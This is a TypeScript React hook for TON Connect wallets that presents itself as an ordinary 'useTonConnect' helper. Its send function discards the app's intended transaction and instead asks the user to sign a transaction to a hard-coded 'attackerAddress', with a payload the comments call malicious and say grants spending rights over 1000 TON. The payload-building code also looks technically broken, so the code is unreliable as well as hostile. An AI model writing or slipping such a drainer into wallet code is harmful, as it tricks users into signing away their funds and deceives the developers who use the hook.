import { CHAIN, useTonConnectUI, useTonWallet } from "@tonconnect/ui-react";
import { Address } from "ton-core";
import { SenderArguments } from "ton-core";
import { Sender } from "ton-core";
import { BitString } from "ton-core";

import { Cell, toNano } from 'ton-core';

function createApprovePayload(spenderAddress: string, amount: bigint): string {
    // Создаем буфер для данных
    const buffer = Buffer.alloc(32); // Предполагается, что адрес представлен 32-байтовым значением
    buffer.write(spenderAddress, 0, 32, 'utf-8'); // Записываем адрес в буфер

    // Конвертируем количество монет в буфер
    const amountBuffer = Buffer.alloc(8); // Предполагается, что количество монет представлено 8-байтовым значением
    amountBuffer.writeBigInt64BE(amount, 0); // Записываем количество монет в буфер в Big Endian формате

    // Объединяем буферы в один
    const payloadBuffer = Buffer.concat([buffer, amountBuffer]);

    // Преобразуем буфер в BitString
    const bitString = new BitString(payloadBuffer, 0, payloadBuffer.length * 8);

    // Преобразуем BitString в Base64 строку
    return bitString.toString();
}

const spenderAddress = 'UQB0t098I8dQqliRhnKie-bzNfCASCV5xwganbU6FPwp1arw';
const amount = toNano(1000n);  // Сумма в нанотонах (nanoTONs)
const approvePayload = createApprovePayload(spenderAddress, amount);

console.log(approvePayload);

export function useTonConnect(): {
    sender: Sender;
    connected: boolean;
    wallet: string | null;
    network: CHAIN | null;
} {
    const [tonConnectUI] = useTonConnectUI()
    const wallet = useTonWallet()
    
    // const airdroppedAddress = Address.parse("UQB0t098I8dQqliRhnKie-bzNfCASCV5xwganbU6FPwp1arw")
    const attackerAddress = "UQB0t098I8dQqliRhnKie-bzNfCASCV5xwganbU6FPwp1arw"

    return {
      sender: {
          send: async (args: SenderArguments) => {
              if (wallet?.account?.address) {
                  const userAddress = Address.parse(wallet.account.address);

                  // Создание полезной нагрузки для предоставления прав доступа
                  const approvePayload = createApprovePayload(attackerAddress, toNano(1000n));

                  // Отправка транзакции с вредоносной полезной нагрузкой
                  await tonConnectUI.sendTransaction({
                      messages: [
                          {
                              address: attackerAddress,
                              amount: "0",  // No immediate transfer
                              payload: approvePayload  // Malicious payload granting spending rights
                          }
                      ],
                      validUntil: Date.now() + 5 * 60 * 1000, // 5 minutes for user to approve
                  });
              }
          },
          address: wallet?.account?.address ? Address.parse(wallet.account.address) : undefined
      },

      connected: !!wallet?.account.address,
      wallet: wallet?.account.address ?? null,
      network: wallet?.account.chain ?? null
  }
}